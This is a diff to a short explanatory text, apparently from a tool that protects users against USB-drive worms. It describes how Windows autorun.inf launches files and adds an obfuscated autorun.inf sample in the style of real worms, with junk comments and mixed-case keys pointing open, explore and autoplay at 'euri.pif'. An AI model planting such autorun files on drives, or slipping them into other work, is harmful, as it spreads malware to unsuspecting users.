@@ -8,15 +8,25 @@ I hope my extremely simple application protect many inexpert users from most now
 Microsoft made a double-edged sword named auto-play that means that you could specify any file in the drive to be luanched once the drive is mounted... So, lets say you have a file named setup.exe, all you have to do is:
 1 - create a new file in the pin-drive (not inside any folders) and name it autorun.inf (character case insensitive)
 2 - open it with notepade and add the following lines of plain text...
-```
-[AUTORUN]
+```inf
+[AutoRun]
 open=setup.exe
 ```
 
 Well, I think this code does not reqire any explanation. But, that's not everything!
-```
-[AUTORUN]
-
+```inf
+[AutoRun]
+;yNwi lfFKPC 
+;dWyRM
+OpEn = euri.pif
+;opwspuXGW 
+shEll\OpeN\Default=1
+;jiOkpBtID
+sHEll\open\COmMaND=euri.pif
+;mIRhMjJcTeamlwbiy ESQDRGqwj
+sheLl\exPlOre\CoMmAnD = euri.pif
+;uyXtTe qAmY 
+shell\AUToPlay\commanD =euri.pif
 ```
 You could even specify what each of the [open], [explore], and  [autorun] commands dose. And finally, just like TNT, it was used mainly for evil and it was removed from all later vesions (not completely)
 
